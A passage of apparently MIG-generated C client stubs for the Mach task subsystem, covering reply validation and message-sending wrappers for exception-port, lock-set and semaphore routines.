	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	{
	    mach_msg_port_descriptor_t	*ptr;
	    int	i;

	    ptr = &Out0P->old_handlers[0];
	    for (i = 0; i < 32; ptr++, i++) {
		if (ptr->type != MACH_MSG_PORT_DESCRIPTOR) {
			return MIG_TYPE_ERROR;
		}
	    }
	}
#endif	/* __MigTypeCheck */

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 128);

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 128);

#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_exception_ports_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_exception_ports */
mig_external kern_return_t task_get_exception_ports
(
	task_t task,
	exception_mask_t exception_mask,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_array_t old_handlers,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		exception_mask_t exception_mask;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_exception_ports_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_exception_ports_t__defined */

	__DeclareSendRpc(3414, "task_get_exception_ports")

	InP->NDR = NDR_record;

	InP->exception_mask = exception_mask;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3414;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3414, "task_get_exception_ports")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3414, "task_get_exception_ports")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_exception_ports_t__defined)
	check_result = __MIG_check__Reply__task_get_exception_ports_t((__Reply__task_get_exception_ports_t *)Out0P, (__Reply__task_get_exception_ports_t **)&Out1P, (__Reply__task_get_exception_ports_t **)&Out2P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_exception_ports_t__defined) */

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 * Out0P->masksCnt);

	*masksCnt = Out0P->masksCnt;

	{
	    mach_msg_port_descriptor_t	*ptr;
	    int	i, j;

	    ptr = &Out0P->old_handlers[0];
	    j = min(Out0P->masksCnt, *masksCnt);
	    for (i = 0; i < j; ptr++, i++) 
		old_handlers[i] = ptr->name;
	    if (Out0P->masksCnt > 32)
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_behaviors, (const char *) Out1P->old_behaviors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_behaviors, (const char *) Out1P->old_behaviors, 4 * Out0P->masksCnt);

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_flavors, (const char *) Out2P->old_flavors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_flavors, (const char *) Out2P->old_flavors, 4 * Out0P->masksCnt);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_swap_exception_ports_t__defined)
#define __MIG_check__Reply__task_swap_exception_ports_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_swap_exception_ports_t(__Reply__task_swap_exception_ports_t *Out0P, __Reply__task_swap_exception_ports_t **Out1PP, __Reply__task_swap_exception_ports_t **Out2PP)
{

	typedef __Reply__task_swap_exception_ports_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 3515) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 32 ||
	    msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) || msgh_size > (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	{
	    mach_msg_port_descriptor_t	*ptr;
	    int	i;

	    ptr = &Out0P->old_handlers[0];
	    for (i = 0; i < 32; ptr++, i++) {
		if (ptr->type != MACH_MSG_PORT_DESCRIPTOR) {
			return MIG_TYPE_ERROR;
		}
	    }
	}
#endif	/* __MigTypeCheck */

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 128);

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 128);

#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 384)) / 4< Out0P->masksCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 384) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_swap_exception_ports_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_swap_exception_ports */
mig_external kern_return_t task_swap_exception_ports
(
	task_t task,
	exception_mask_t exception_mask,
	mach_port_t new_port,
	exception_behavior_t behavior,
	thread_state_flavor_t new_flavor,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_array_t old_handlers,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		exception_mask_t exception_mask;
		exception_behavior_t behavior;
		thread_state_flavor_t new_flavor;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_swap_exception_ports_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_swap_exception_ports_t__defined */

	__DeclareSendRpc(3415, "task_swap_exception_ports")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t new_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->new_port = new_portTemplate;
	InP->new_port.name = new_port;
#else	/* UseStaticTemplates */
	InP->new_port.name = new_port;
	InP->new_port.disposition = 19;
	InP->new_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->exception_mask = exception_mask;

	InP->behavior = behavior;

	InP->new_flavor = new_flavor;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3415;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3415, "task_swap_exception_ports")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3415, "task_swap_exception_ports")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_swap_exception_ports_t__defined)
	check_result = __MIG_check__Reply__task_swap_exception_ports_t((__Reply__task_swap_exception_ports_t *)Out0P, (__Reply__task_swap_exception_ports_t **)&Out1P, (__Reply__task_swap_exception_ports_t **)&Out2P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_swap_exception_ports_t__defined) */

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 * Out0P->masksCnt);

	*masksCnt = Out0P->masksCnt;

	{
	    mach_msg_port_descriptor_t	*ptr;
	    int	i, j;

	    ptr = &Out0P->old_handlers[0];
	    j = min(Out0P->masksCnt, *masksCnt);
	    for (i = 0; i < j; ptr++, i++) 
		old_handlers[i] = ptr->name;
	    if (Out0P->masksCnt > 32)
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_behaviors, (const char *) Out1P->old_behaviors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_behaviors, (const char *) Out1P->old_behaviors, 4 * Out0P->masksCnt);

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_flavors, (const char *) Out2P->old_flavors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_flavors, (const char *) Out2P->old_flavors, 4 * Out0P->masksCnt);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__lock_set_create_t__defined)
#define __MIG_check__Reply__lock_set_create_t__defined

mig_internal kern_return_t __MIG_check__Reply__lock_set_create_t(__Reply__lock_set_create_t *Out0P)
{

	typedef __Reply__lock_set_create_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3516) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->new_lock_set.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->new_lock_set.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__lock_set_create_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine lock_set_create */
mig_external kern_return_t lock_set_create
(
	task_t task,
	lock_set_t *new_lock_set,
	int n_ulocks,
	int policy
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int n_ulocks;
		int policy;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_lock_set;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_lock_set;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__lock_set_create_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__lock_set_create_t__defined */

	__DeclareSendRpc(3416, "lock_set_create")

	InP->NDR = NDR_record;

	InP->n_ulocks = n_ulocks;

	InP->policy = policy;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3416;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3416, "lock_set_create")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3416, "lock_set_create")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__lock_set_create_t__defined)
	check_result = __MIG_check__Reply__lock_set_create_t((__Reply__lock_set_create_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__lock_set_create_t__defined) */

	*new_lock_set = Out0P->new_lock_set.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__lock_set_destroy_t__defined)
#define __MIG_check__Reply__lock_set_destroy_t__defined

mig_internal kern_return_t __MIG_check__Reply__lock_set_destroy_t(__Reply__lock_set_destroy_t *Out0P)
{

	typedef __Reply__lock_set_destroy_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3517) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__lock_set_destroy_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine lock_set_destroy */
mig_external kern_return_t lock_set_destroy
(
	task_t task,
	lock_set_t lock_set
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t lock_set;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__lock_set_destroy_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__lock_set_destroy_t__defined */

	__DeclareSendRpc(3417, "lock_set_destroy")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t lock_setTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->lock_set = lock_setTemplate;
	InP->lock_set.name = lock_set;
#else	/* UseStaticTemplates */
	InP->lock_set.name = lock_set;
	InP->lock_set.disposition = 19;
	InP->lock_set.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3417;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3417, "lock_set_destroy")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3417, "lock_set_destroy")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__lock_set_destroy_t__defined)
	check_result = __MIG_check__Reply__lock_set_destroy_t((__Reply__lock_set_destroy_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__lock_set_destroy_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__semaphore_create_t__defined)
#define __MIG_check__Reply__semaphore_create_t__defined

mig_internal kern_return_t __MIG_check__Reply__semaphore_create_t(__Reply__semaphore_create_t *Out0P)
{

	typedef __Reply__semaphore_create_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3518) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->semaphore.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->semaphore.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__semaphore_create_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine semaphore_create */
mig_external kern_return_t semaphore_create
(
	task_t task,
	semaphore_t *semaphore,
	int policy,
	int value
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int policy;
		int value;
	} Request __attribute__((unused));
